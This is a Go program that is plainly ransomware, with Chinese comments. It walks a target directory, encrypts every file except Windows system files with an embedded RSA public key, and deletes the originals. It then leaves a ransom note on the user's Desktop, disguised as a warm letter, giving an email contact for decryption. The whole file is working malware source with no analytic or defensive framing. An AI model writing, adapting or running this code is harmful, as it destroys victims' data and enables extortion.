package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
	"os/user"
)

// 公钥字符串表示
const publicKeyString = `
-----BEGIN RSA PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAo6siZm7gTPS95JuPQqXK
+LFIggdtft2WHcmdOjSd1RQOZ5SFdb1edzSdTYVYZv6gokbcxDgyhNmB18uQityA
iO75gN1XOzo9TQlbnr6bDKSmv5AGLWQm10FDRVGeq9UA3vmjb+yY8aKP1P67SIuD
MFAjt3rWLAPzbO9Y/QgT1EQvFNEbUP82Nf4rSRY1llL+oQmrl4rpx47IKgJ31QmO
fvbBtgEaqEUjvX2f223BCLcwrLhlSUZaaWFj1pHsFSf+ozL02sQncFXHBLGxAW9B
rdxn9B6vWVVCVvXTGJCOs97B2Ug1n23QGDp2lQK1Wy9D143q6URSq473SLbDRDpb
NwIDAQAB
-----END RSA PUBLIC KEY-----
`

func main() {
	// 检查是否提供了目录路径作为命令行参数
	if len(os.Args) < 2 {
		fmt.Println("Please provide a directory path as an argument.")
		return
	}
	directory := os.Args[1]

	// 解码PEM格式的公钥
	block, _ := pem.Decode([]byte(publicKeyString))
	if block == nil {
		fmt.Println("Failed to decode PEM block containing public key")
		return
	}
	if got, want := block.Type, "RSA PUBLIC KEY"; got != want {
		fmt.Printf("Unknown PEM block type %q, want %q", got, want)
		return
	}

	// 解析公钥
	publicKey, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		fmt.Println("Failed to parse public key:", err)
		return
	}

	// 将公钥转换为RSA类型
	rsaPublicKey, ok := publicKey.(*rsa.PublicKey)
	if !ok {
		fmt.Println("Failed to convert public key to RSA type")
		return
	}

	// 遍历目录下的所有文件
	err = filepath.Walk(directory, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() {
			// 检查文件路径是否包含Windows系统目录
			if strings.Contains(strings.ToLower(path), "c:\\windows\\") {
				fmt.Println("Windows system file ignored:", path)
				return nil
			}

			// 读取文件内容
			plaintext, err := ioutil.ReadFile(path)
			if err != nil {
				fmt.Println("Failed to read file:", path, err)
				return nil
			}

			// 使用公钥加密文件内容（分块加密）
			ciphertext, err := encrypt(rsaPublicKey, plaintext)
			if err != nil {
				fmt.Println("Failed to encrypt file:", path, err)
				return nil
			}

			// 将加密后的内容写入同名文件".encrypted"
			encryptedFilePath := path + ".encrypted"
			err = ioutil.WriteFile(encryptedFilePath, ciphertext, 0644)
			if err != nil {
				fmt.Println("Failed to write encrypted file:", encryptedFilePath, err)
				return nil
			}
			fmt.Println("File encrypted:", path)

			// 删除原始文件
			err = os.Remove(path)
			if err != nil {
				fmt.Println("Failed to delete file:", path, err)
				return nil
			}
			fmt.Println("Original file deleted:", path)
		}
		return nil
	})

	if err != nil {
		fmt.Println("Error walking directory:", err)
		return
	}

	// 获取当前用户的桌面路径
	currentUser, err := user.Current()
	if err != nil {
		fmt.Println("Failed to get current user:", err)
		return
	}
	desktopPath := filepath.Join(currentUser.HomeDir, "Desktop")

	// 在桌面上创建问候文件并写入问候语
	greetingFilePath := filepath.Join(desktopPath, "hello.txt")
	greetingContent := "Dear friends,\n I hope this letter finds you in good health and in good spirits.\n I wanted to take a moment to reach out and extend my warmest regards.\n Your files have been encrypted, please contact me if you would like to decrypt your files.\n My email address: xxxxx@outlook.com\n Thank you for being such a special part of my life.\n Your friendship means the world to me and I am grateful for all the memories we have created together.\n I wish you all the best and look forward to hearing from you soon.\n Warm greetings from distant friends "

	err = ioutil.WriteFile(greetingFilePath, []byte(greetingContent), 0644)
	if err != nil {
		fmt.Println("Failed to write greeting file:", err)
		return
	}

	fmt.Println("Greeting file created successfully at:", greetingFilePath)
}

// 加密数据（分块加密）
func encrypt(publicKey *rsa.PublicKey, plaintext []byte) ([]byte, error) {
	// 计算每块加密数据的长度
	keySize := publicKey.Size()
	chunkSize := keySize - 11 // RSA加密块大小为密钥长度 - 11字节

	// 分块加密数据
	var ciphertext []byte
	for i := 0; i < len(plaintext); i += chunkSize {
		endIndex := i + chunkSize
		if endIndex > len(plaintext) {
			endIndex = len(plaintext)
		}
		chunk, err := rsa.EncryptPKCS1v15(rand.Reader, publicKey, plaintext[i:endIndex])
		if err != nil {
			return nil, err
		}
		ciphertext = append(ciphertext, chunk...)
	}

	return ciphertext, nil
}
